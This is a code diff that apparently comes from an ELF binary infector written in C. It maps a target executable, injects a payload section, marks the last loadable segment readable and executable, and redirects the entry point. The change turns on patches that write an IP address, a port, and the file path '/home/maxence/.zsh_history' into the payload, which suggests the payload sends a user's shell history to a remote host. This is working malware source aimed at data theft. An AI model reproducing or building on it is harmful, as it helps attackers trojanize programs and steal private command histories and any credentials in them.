@@ -124,15 +124,6 @@ int main(int ac, char **av) {
 	 * 
 	 */
 
-	// memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_IPADDROFF, &addr_ip, sizeof(uint32_t));
-	// memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
-	const char targetfile[] = "/home/maxence/.zsh_history";
-	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PATHOFF, targetfile, sizeof(targetfile));
-
-	/**
-	 * 
-	 */
-
 	ehdr->e_shoff += payload_size_p;
 
 	last_loadable_phdr->p_flags |= PF_R | PF_X;
@@ -195,6 +186,19 @@ int main(int ac, char **av) {
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
 	}
+
+	/**
+	 * 
+	 */
+
+	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_IPADDROFF, &addr_ip, sizeof(uint32_t));
+	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
+	const char targetfile[] = "/home/maxence/.zsh_history";
+	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PATHOFF, targetfile, sizeof(targetfile));
+
+	/**
+	 * 
+	 */
 
 	// Update the entry point
 	Elf64_Addr last_entry_point = ehdr->e_entry;
